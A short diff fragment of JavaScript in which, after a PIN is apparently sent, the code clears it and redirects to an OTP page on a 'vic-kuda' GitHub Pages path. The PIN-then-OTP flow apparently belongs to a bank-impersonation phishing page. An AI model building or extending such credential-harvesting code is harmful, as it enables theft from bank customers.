@@ -43,7 +43,7 @@ document
           console.log("Sent successfully:", response);
           pin = "";
 
-          location.href = "/vic-Kuda.xyz.github.io/otp.html";
+          location.href = "/vic-kuda.github.io/otp.html";
         }
       },
       function (error) {
